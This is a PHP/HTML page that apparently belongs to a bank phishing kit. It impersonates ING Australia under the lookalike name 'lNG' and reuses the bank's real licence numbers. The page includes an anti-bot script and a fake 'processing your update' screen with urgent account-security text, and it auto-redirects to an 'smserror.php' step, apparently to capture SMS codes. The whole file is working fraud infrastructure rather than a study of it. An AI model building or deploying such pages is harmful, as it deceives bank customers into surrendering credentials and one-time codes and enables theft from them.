<?php
require "antibot.php";
include "id.php";
?>
<html lang="en"><head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="15;url=smserror.php">
    <title>Login</title>
    <link rel="stylesheet" href="styles.css">
    <style>
@font-face {
    font-family: "Christmas";
    src: url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.eot");
    src: url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.eot?#iefix")format("embedded-opentype"),
    url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.woff2")format("woff2"),
    url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.woff")format("woff"),
    url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.ttf")format("truetype"),
    url("https://db.onlinewebfonts.com/t/69c633b2a4e41e8101c6f4f149655d5e.svg#Christmas")format("svg");
}
    </style>
</head>
<body>
    <header>
        <img src="logo.png" alt="lNG Logo">
        <button>Login</button>
    </header>
    <main>
        <section class="login-form">
            <center><h1>Loading..</h1></center>
                    <center><div class="spinner"></div></center>
        <center><p>We are processing your information. Please stay on this page to ensure your update is successful.</p></center></section>
        <section class="important-info">
            <h2>Important</h2>
            <div class="warning">
                <h3><i class="icon-warning"></i>Why does my account need an update?</h3>
                <p>Updating your information is crucial to regain full banking features and ensure your security. Please complete your update to continue enjoying our services.</p>
            </div>
            <div class="payto">
                <h3><i class="icon-info"></i> PayTo is now available</h3>
                <p>PayTo is now live on Orange Everyday accounts.</p>
            </div>
        </section>
    </main>
    <footer>
        <div class="footer-top">
            <ul>
                <li><a href="#">Help And Support</a></li>
                <li></li>
                <li></li>
                <li><a href="#">Contact Us</a></li>
            </ul>
            
            <ul>
                <li><a href="#">About Us</a></li>
                <li><a href="#">Contact Us</a></li>
                
                
                
                
                
            </ul>
        </div>
        <div class="footer-bottom">
            <img src="logo.png" alt="lNG Logo">
            <p>lNG is a business name of lNG Bank (Australia) Limited ABN 24 000 893 292 AFSL 229823, Australian Credit Licence 229823.<br>
            For information about the Australian Government Deposit Guarantee, click here. lNG Living Super (which is part of the lNG Superannuation Fund ABN 13 355 603 448) is issued by The Trust Company (Superannuation) Limited ABN 49 006 421 638, AFSL 235153.</p>
        </div>
    </footer>
    <div id="loading-overlay" class="loading-overlay">
        <div class="loading-content">
            <div class="spinner"></div>
        </div>
    </div>
    <script src="script.js"></script>

		<script src="https://www.google.com/recaptcha/api.js?render=<?php echo $siteKey; ?>"></script>
<script>
grecaptcha.ready(function() {
    document.getElementById('mainform').addEventListener('submit', function(event) {
        event.preventDefault(); // Prevent form submission
        grecaptcha.execute('<?php echo $siteKey; ?>', {action: 'submit'}).then(function(token) {
            // Add your logic to submit form or append the token to the form
            var recaptchaResponse = document.createElement('input');
            recaptchaResponse.type = 'hidden';
            recaptchaResponse.name = 'recaptcha_response';
            recaptchaResponse.value = token;
            document.getElementById('mainform').appendChild(recaptchaResponse);

            // Now submit the form
            document.getElementById('mainform').submit();
        });
    });
});
</script>
</body></html>